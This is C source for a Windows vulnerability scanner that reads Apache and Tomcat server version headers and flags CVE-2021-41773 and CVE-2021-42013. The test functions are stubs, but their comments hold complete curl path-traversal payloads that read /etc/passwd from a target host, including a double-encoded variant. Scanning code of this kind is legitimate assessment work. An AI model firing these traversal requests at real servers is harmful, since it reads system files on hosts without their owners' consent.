#include <Windows.h>
#include "ToolsHTTP.h"
#include "Network.h"

BOOL TestCVE_2021_41773(char* ipAddress, int port, HTTP_STRUC httpStructPage){
	// curl --silent --path-as-is --insecure "http://10.10.11.104/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep -q "root.*" && echo "Host is vulnerable" || echo "Host is Not vulnerable"
	return FALSE;
}
BOOL TestCVE_2021_42013(char* ipAddress, int port, HTTP_STRUC httpStructPage){
	// curl --silent --path-as-is --insecure "http://10.10.11.104/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd" | grep -q "root.*" && echo "Host is vulnerable" || echo "Host is Not vulnerable"
	return FALSE;
}

BOOL CheckApacheCVE(char* ipAddress, int port, HTTP_STRUC httpStructPage, BOOL isTestEnable) {
	if (strstr(httpStructPage.ServerName, "2.4.49")) { 
		printf("\t\t[!] Server version vulnerable to CVE-2021-41773 !\n");
		if (isTestEnable)
			TestCVE_2021_41773(ipAddress, port, httpStructPage);
		return TRUE;
	}else if (strstr(httpStructPage.ServerName, "2.4.50")) { 
		printf("\t\t[!] Server version vulnerable to CVE-2021-42013 !\n"); 
		if (isTestEnable)
			TestCVE_2021_42013(ipAddress, port, httpStructPage);
		return TRUE;
	}
	if (isTestEnable) {
		TestCVE_2021_41773(ipAddress, port, httpStructPage);
		TestCVE_2021_42013(ipAddress, port, httpStructPage);
	}
	return FALSE;
}


BOOL CheckApacheTomcatCVE(char* ipAddress, int port, HTTP_STRUC httpStructPage, BOOL isTestEnable) {
	// Todo
	// 9.0.0.M1 to 9.0.0.30
	// 8.5.0 to 8.5.50
	// 7.0.0 to 7.0.99
	// printf("\t\t[!] Server version vulnerable to Ghostcat (CVE-2020-1938) !\n");

	return FALSE;
}
BOOL CheckApacheNginxCVE(char* ipAddress, int port, HTTP_STRUC httpStructPage, BOOL isTestEnable) {
	// Todo
	// Nginx 0.7.61 
	// printf("\t\t[!] Server version vulnerable to Ghostcat (CVE-2009-3898) !\n");

	return FALSE;
}
ServerType CheckCVE(char* ipAddress, int port, HTTP_STRUC httpStructPage, BOOL isTestEnable) {
	UINT i;
	if(httpStructPage.ServerName == NULL)
		return UnknownServer;

	char* tempServerName = (char*)malloc(BUFFER_SIZE);
	if (tempServerName == NULL)
		return UnknownServer;

	strcpy_s(tempServerName, BUFFER_SIZE, httpStructPage.ServerName);
	StrToLower(tempServerName);
	for (i = 0; i < ARRAY_SIZE_CHAR(sereverTypeStr) && !strstr(tempServerName, sereverTypeStr[i]); i++) {
		strcpy_s(tempServerName, BUFFER_SIZE, httpStructPage.ServerName);
		StrToLower(tempServerName);
	}

	switch (i) {
	case ApacheTomcat:
		CheckApacheTomcatCVE(ipAddress, port, httpStructPage, isTestEnable);
		break;
	case ApacheHttpd:
		CheckApacheCVE(ipAddress, port, httpStructPage, isTestEnable);
		break;
	default:
		break;
	}
	free(tempServerName);
	return i;
}